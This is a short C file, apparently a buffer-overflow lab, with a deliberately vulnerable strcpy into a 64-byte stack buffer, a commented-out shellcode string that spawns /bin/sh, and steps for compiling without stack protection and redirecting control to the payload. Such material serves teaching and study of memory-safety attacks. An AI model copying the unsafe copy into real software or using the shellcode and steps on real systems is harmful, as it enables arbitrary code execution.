#include <stdio.h>
#include <string.h>

// const char shellcode [] = "\xeb\x28\x5e\x48\x89\x76\x08\x48\x31\xc0\x48\x89\x46\x10\x48\x89\x46\x07\x48\x89\xc2\xb0\x3b\x48\x89\xf7\x48\x8d\x76\x08\x0f\x05\x48\x31\xc0\x48\x89\xc7\xb0\x3c\x0f\x05\xe8\xd3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x90\x90";

int foo (const char *arg) {
	char buf [64];
	strcpy(buf, arg);
	return 0;
}

int main (int argc, char* argv[]) {
	foo(argv[1]);
	return 0;
}

/*
HOW TO USE THE CODE?

1a. Compile `shell.c` to generate the executable.
1b. Run the executable using gdb
1c. Disassemble the correct function to extract the compiled shell script

2. Compile `vuln.c` as follows:
$ gcc -fno-stack-protector -z execstack -g vuln.c -o vuln

3. Run the executable in gdb and then pass the shellscript as commandline-arguement.

4. Once the malicious script is loaded, then try to transfer control to your malicious code.
*/